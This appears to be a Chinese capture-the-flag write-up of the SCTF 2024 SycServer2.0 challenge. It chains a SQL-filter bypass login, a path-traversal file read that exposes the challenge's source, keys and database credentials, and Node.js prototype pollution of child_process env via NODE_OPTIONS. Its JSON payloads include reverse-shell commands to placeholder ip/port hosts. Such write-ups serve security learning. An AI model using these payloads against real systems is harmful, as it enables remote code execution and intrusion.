---
title: "2024SCTF Sysclover2原型链污染环境变量"
onlyTitle: true
date: 2024-10-5 19:12:23
categories:
- nodejs
tags:
- nodejs
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8109.jpg
---

觉得自己牛逼了？打个比赛你就老实了

## SCTF SycServer2.0原型链污染

/robots.txt

```TypeScript
User-agent: *
Disallow:
Disallow: /ExP0rtApi?v=static&f=1.jpeg
```

config下有公钥文件

```JavaScript
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC5nJzSXtjxAB2tuz5WD9B//vLQ
TfCUTc+AOwpNdBsOyoRcupuBmh8XSVnm5R4EXWS6crL5K3LZe5vO5YvmisqAq2IC
XmWF4LwUIUfk4/2cQLNl+A0czlskBZvjQczOKXB+yvP4xMDXuc1hIujnqFlwOpGe
I+Atul1rSE0APhHoPwIDAQAB
-----END PUBLIC KEY-----
```

首页有登录处理javascript，过滤了一下sql，不过没过滤空格，`1 or 1=1-- `万能密码，用上面的公钥rsa直接登录

```js
function wafsql(str){
        return str.replace(/[\-\_\,\!\|\~\`\(\)\#\$\%\^\&\*\{\}\:\;\"\<\>\?\\\/\'\ ]/g, '');
    }
    function getCookie(name) {
        const value = `; ${document.cookie}`;
        const parts = value.split(`; ${name}=`);
        if (parts.length === 2) return parts.pop().split(';').shift();
    }

    const authToken = getCookie('auth_token');

    if (authToken) {
        window.location.href = '/hello';
    }

    document.getElementById('loginForm').addEventListener('submit', async function(e) {
      e.preventDefault();

      const username = wafsql(document.getElementById('username').value);
      const password = wafsql(document.getElementById('password').value);

      const response = await fetch('/config');
      const { publicKey } = await response.json();

      const encrypt = new JSEncrypt();
      encrypt.setPublicKey(publicKey);

      const encryptedPassword = encrypt.encrypt(password);

      const formData = {
        username: username,
        password: encryptedPassword
      };

      const loginResponse = await fetch('/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(formData),
      });

      const result = await loginResponse.json();
      if (result.success) {
        alert('登录成功');
        window.location.href = "/hello"
      } else {
        alert('登录失败：' + result.message);
      }
    });
```

`/ExP0rtApi?v=./&f=app.js`接口可以读文件，v参数双写绕过目录穿越，分别读到app.js：

```JavaScript
const express = require('express');
const fs = require('fs');
var nodeRsa = require('node-rsa');
const bodyParser = require('body-parser');
const jwt = require('jsonwebtoken');
const crypto = require('crypto');
const SECRET_KEY = crypto.randomBytes(16).toString('hex');
const path = require('path');
const zlib = require('zlib');
const mysql = require('mysql')
const handle = require('./handle');
const cp = require('child_process');
const cookieParser = require('cookie-parser');

const con = mysql.createConnection({
  host: 'localhost',
  user: 'ctf',
  password: 'ctf123123',
  port: '3306',
  database: 'sctf'
})
con.connect((err) => {
  if (err) {
    console.error('Error connecting to MySQL:', err.message);
    setTimeout(con.connect(), 2000); // 2秒后重试连接
  } else {
    console.log('Connected to MySQL');
  }
});

const {response} = require("express");
const req = require("express/lib/request");

var key = new nodeRsa({ b: 1024 });
key.setOptions({ encryptionScheme: 'pkcs1' });

var publicPem = `-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC5nJzSXtjxAB2tuz5WD9B//vLQ\nTfCUTc+AOwpNdBsOyoRcupuBmh8XSVnm5R4EXWS6crL5K3LZe5vO5YvmisqAq2IC\nXmWF4LwUIUfk4/2cQLNl+A0czlskBZvjQczOKXB+yvP4xMDXuc1hIujnqFlwOpGe\nI+Atul1rSE0APhHoPwIDAQAB\n-----END PUBLIC KEY-----`;
var privatePem = `-----BEGIN PRIVATE KEY-----
MIICeAIBADANBgkqhkiG9w0BAQEFAASCAmIwggJeAgEAAoGBALmcnNJe2PEAHa27
PlYP0H/+8tBN8JRNz4A7Ck10Gw7KhFy6m4GaHxdJWeblHgRdZLpysvkrctl7m87l
i+aKyoCrYgJeZYXgvBQhR+Tj/ZxAs2X4DRzOWyQFm+NBzM4pcH7K8/jEwNe5zWEi
6OeoWXA6kZ4j4C26XWtITQA+Eeg/AgMBAAECgYA+eBhLsUJgckKK2y8StgXdXkgI
lYK31yxUIwrHoKEOrFg6AVAfIWj/ZF+Ol2Qv4eLp4Xqc4+OmkLSSwK0CLYoTiZFY
Jal64w9KFiPUo1S2E9abggQ4omohGDhXzXfY+H8HO4ZRr0TL4GG+Q2SphkNIDk61
khWQdvN1bL13YVOugQJBAP77jr5Y8oUkIsQG+eEPoaykhe0PPO408GFm56sVS8aT
6sk6I63Byk/DOp1MEBFlDGIUWPjbjzwgYouYTbwLwv8CQQC6WjLfpPLBWAZ4nE78
dfoDzqFcmUN8KevjJI9B/rV2I8M/4f/UOD8cPEg8kzur7fHga04YfipaxT3Am1kG
mhrBAkEA90J56ZvXkcS48d7R8a122jOwq3FbZKNxdwKTJRRBpw9JXllCv/xsc2ye
KmrYKgYTPAj/PlOrUmMVLMlEmFXPgQJBAK4V6yaf6iOSfuEXbHZOJBSAaJ+fkbqh
UvqrwaSuNIi72f+IubxgGxzed8EW7gysSWQT+i3JVvna/tg6h40yU0ECQQCe7l8l
zIdwm/xUWl1jLyYgogexnj3exMfQISW5442erOtJK8MFuUJNHFMsJWgMKOup+pOg
xu/vfQ0A1jHRNC7t
-----END PRIVATE KEY-----`;

const app = express();
app.use(bodyParser.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'static')));
app.use(cookieParser());

var Reportcache = {}

function verifyAdmin(req, res, next) {
  const token = req.cookies['auth_token'];

  if (!token) {
    return res.status(403).json({ message: 'No token provided' });
  }

  jwt.verify(token, SECRET_KEY, (err, decoded) => {
    if (err) {
      return res.status(403).json({ message: 'Failed to authenticate token' });
    }

    if (decoded.role !== 'admin') {
      return res.status(403).json({ message: 'Access denied. Admins only.' });
    }

    req.user = decoded;
    next();
  });
}

app.get('/hello', verifyAdmin ,(req, res)=> {
  res.send('<h1>Welcome Admin!!!</h1><br><img src="./1.jpeg" />');
});

app.get('/config', (req, res) => {
  res.json({
    publicKey: publicPem,
  });
});

var decrypt = function(body) {
  try {
    var pem = privatePem;
    var key = new nodeRsa(pem, {
      encryptionScheme: 'pkcs1',
      b: 1024
    });
    key.setOptions({ environment: "browser" });
    return key.decrypt(body, 'utf8');
  } catch (e) {
    console.error("decrypt error", e);
    return false;
  }
};

app.post('/login', (req, res) => {
  const encryptedPassword = req.body.password;
  const username = req.body.username;

  try {
    passwd = decrypt(encryptedPassword)
    if(username === 'admin') {
      const sql = `select (select password from user where username = 'admin') = '${passwd}';`
      con.query(sql, (err, rows) => {
        if (err) throw new Error(err.message);
        if (rows[0][Object.keys(rows[0])]) {
          const token = jwt.sign({username, role: username}, SECRET_KEY, {expiresIn: '1h'});
          res.cookie('auth_token', token, {secure: false});
          res.status(200).json({success: true, message: 'Login Successfully'});
        } else {
          res.status(200).json({success: false, message: 'Errow Password!'});
        }
      });
    } else {
      res.status(403).json({success: false, message: 'This Website Only Open for admin'});
    }
  } catch (error) {
    res.status(500).json({ success: false, message: 'Error decrypting password!' });
  }
});

app.get('/ExP0rtApi', verifyAdmin, (req, res) => {
  var rootpath = req.query.v;
  var file = req.query.f;

  file = file.replace(/\.\.\//g, '');
  rootpath = rootpath.replace(/\.\.\//g, '');

  if(rootpath === ''){
    if(file === ''){
      return res.status(500).send('try to find parameters HaHa');
    } else {
      rootpath = "static"
    }
  }

  const filePath = path.join(__dirname, rootpath + "/" + file);

  if (!fs.existsSync(filePath)) {
    return res.status(404).send('File not found');
  }
  fs.readFile(filePath, (err, fileData) => {
    if (err) {
      console.error('Error reading file:', err);
      return res.status(500).send('Error reading file');
    }

    zlib.gzip(fileData, (err, compressedData) => {
      if (err) {
        console.error('Error compressing file:', err);
        return res.status(500).send('Error compressing file');
      }
      const base64Data = compressedData.toString('base64');
      res.send(base64Data);
    });
  });
});

app.get("/report", verifyAdmin ,(req, res) => {
  res.sendFile(__dirname + "/static/report_noway_dirsearch.html");
});

app.post("/report", verifyAdmin ,(req, res) => {
  const {user, date, reportmessage} = req.body;
  if(Reportcache[user] === undefined) {
    Reportcache[user] = {};
  }
  Reportcache[user][date] = reportmessage
  res.status(200).send("<script>alert('Report Success');window.location.href='/report'</script>");
});

app.get('/countreport', (req, res) => {
  let count = 0;
  for (const user in Reportcache) {
    count += Object.keys(Reportcache[user]).length;
  }
  res.json({ count });
});

//查看当前运行用户
app.get("/VanZY_s_T3st", (req, res) => {
  var command = 'whoami';
  const cmd = cp.spawn(command ,[]);
  cmd.stdout.on('data', (data) => {
    res.status(200).end(data.toString());
  });
})

app.listen(3000, () => {
  console.log('Server running on http://localhost:3000');
});
```

handle/index.js：

```TypeScript
var ritm = require('require-in-the-middle');
var patchChildProcess = require('./child_process');

new ritm.Hook(
    ['child_process'],
    function (module, name) {
        switch (name) {
            case 'child_process': {
                return patchChildProcess(module);
            }
        }
    }
);
```

handle/child_process.js

```TypeScript
function patchChildProcess(cp) {

    cp.execFile = new Proxy(cp.execFile, { apply: patchOptions(true) });
    cp.fork = new Proxy(cp.fork, { apply: patchOptions(true) });
    cp.spawn = new Proxy(cp.spawn, { apply: patchOptions(true) });
    cp.execFileSync = new Proxy(cp.execFileSync, { apply: patchOptions(true) });
    cp.execSync = new Proxy(cp.execSync, { apply: patchOptions() });
    cp.spawnSync = new Proxy(cp.spawnSync, { apply: patchOptions(true) });

    return cp;
}

function patchOptions(hasArgs) {
    return function apply(target, thisArg, args) {
        var pos = 1;
        if (pos === args.length) {
            args[pos] = prototypelessSpawnOpts();
        } else if (pos < args.length) {
            if (hasArgs && (Array.isArray(args[pos]) || args[pos] == null)) {
                pos++;
            }
            if (typeof args[pos] === 'object' && args[pos] !== null) {
                args[pos] = prototypelessSpawnOpts(args[pos]);
            } else if (args[pos] == null) {
                args[pos] = prototypelessSpawnOpts();
            } else if (typeof args[pos] === 'function') {
                args.splice(pos, 0, prototypelessSpawnOpts());
            }
        }

        return target.apply(thisArg, args);
    };
}

function prototypelessSpawnOpts(obj) {
    var prototypelessObj = Object.assign(Object.create(null), obj);
    prototypelessObj.env = Object.assign(Object.create(null), prototypelessObj.env || process.env);
    return prototypelessObj;
}

module.exports = patchChildProcess;
```

应该是原型链污染了，原题应该出自：

https://xz.aliyun.com/t/6755?time__1311=n4%2BxnD0Dg7GQDtYbq05%2BbDynRDkYDcmxQw4YeID&u_atoken=a973634db876aa3f341051d13d508b03&u_asig=1a0c399a17277759720237598e0046#:~:text=child_

我们来分析一下上文提出的污染child_process到rce

child_process内置了6个方法:execFileSync、execSync、fork、exec、execFile、spawn()

最终都是调用spawn()，其中spawn()的本质是创建ChildProcess的实例并返回。

### 污染child_process options

在spawn打上断点

```javascript
const { spawn } = require('child_process');

spawn('whoami').stdout.on('data', (data) => {
    console.log(`stdout: ${data}`);
});
```

spawn会调用normalizeSpawnArguments

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001175545431.png)

注意在normalizeSpawnArguments中，如果options有env属性，这里env为options.env

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001175731386.png)

后面就是各种put，返回这个env，正常来说这个env是process.env，也就是系统环境变量

回到spawn，新建了子进程ChildProcess，并调用原生spawn

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001180433568.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001181001977.png)

又因为nodejs>8.0时，新增加了一个命令行参数`NODE_OPTIONS`，执行js脚本的时候用以下参数指定另外一个js进行包含，包含嘛，也会执行代码

```shell
NODE_OPTIONS='--require ./evil.js' node
```

node进程启动时，会默认附带环境变量作为命令行参数，如果环境变量里有`NODE_OPTIONS`参数，也会默认执行。node子进程也如此。

> node运行时会把当前进程的env写进系统的环境变量，子进程也一样，在linux中存储为`/proc/self/environ`。

如果我们能覆盖options.env，使env的值为恶意js代码，这样node运行时会把当前恶意代码写入`/proc/self/environ`

再向env写入`NODE_OPTIONS`参数，参数值为`--require /proc/self/environ`，就能RCE

options是Obeject，直接污染Object.env就OK

而且file必须为node，否则无法将NODE_OPTIONS载入

exec、execFile函数无论传入什么命令，file的值都会为`/bin/sh`，所以默认不能用这种办法打

一般来说payload长这样：

```json
{
    "constructor.prototype.shell":"node",
    "constructor.prototype.env.AnyString": "require('child_process').execSync('nc ip port -e /bin/bash');process.exit();//",
    "constructor.prototype.env.NODE_OPTIONS":"-r /proc/self/environ"
}
```

下面就是绕过过滤了

### 绕过

child_process.js导入了环境变量

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001183303007.png)

就像我们上面提到的，环境变量会被写入文件，每次进程运行时会自动调用。也就是我们每次调用execFile,fork等以下六种代码执行的函数时都会创建一个代理，代理对象用patchOptions处理

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001183405742.png)

读一下patchOptions函数。参数长度为1调用prototypelessSpawnOpt返回一个无原型Object

```js
function patchOptions(hasArgs) {
    return function apply(target, thisArg, args) {
        var pos = 1;
        if (pos === args.length) {
            args[pos] = prototypelessSpawnOpts();
        } else if (pos < args.length) {
            if (hasArgs && (Array.isArray(args[pos]) || args[pos] == null)) {
                pos++;
            }
            if (typeof args[pos] === 'object' && args[pos] !== null) {
                args[pos] = prototypelessSpawnOpts(args[pos]);
            } else if (args[pos] == null) {
                args[pos] = prototypelessSpawnOpts();
            } else if (typeof args[pos] === 'function') {
                args.splice(pos, 0, prototypelessSpawnOpts());
            }
        }

        return target.apply(thisArg, args);
    };
}
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001183726421.png)

prototypelessSpawnOpts真的返回的是无原型的Object吗，那参数obj拿来干嘛的？

抄gpt的代码解释：

>创建一个没有原型的空对象，并将传入的对象obj的属性复制到新对象上。
>如果obj有env属性，则创建一个没有原型的新环境对象，并将env属性值复制过来；否则，创建一个没有原型的新环境对象，并将process.env的值复制过来

啊哈，完全是能用env，前提是要有obj参数传进。那定位到上面看哪里能传参数。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001190102386.png)

length当然不能等于1

length>1时，hasArgs为真，第一个参数为空或者第一个参数为数组时，进入第二个if

判断第二个参数是否为Object且不为空

要想有第一个参数而没有第二个参数确实难搞，但污染属性`2`，Object.2就会传递进去



再看看在哪传参

在/report路由下

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001184907533.png)

Reportcache是个对象

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001185054216.png)

`Reportcache[__proto__][key]`==`Object.__proto__.value`

带上身份POST payload

```json
{
"user":"__proto__",
"date":2,
"reportmessage": 
    {
    "shell":"/readflag",
    "env": 
        {
            "NODE_DEBUG": "require(\"child_process\").exec(\"bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'\");process.exit()//",
        	"NODE_OPTIONS": "--require /proc/self/environ"
        }
    }
}
```

然后请求/VanZY_s_T3st路由触发

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001173945183.png)

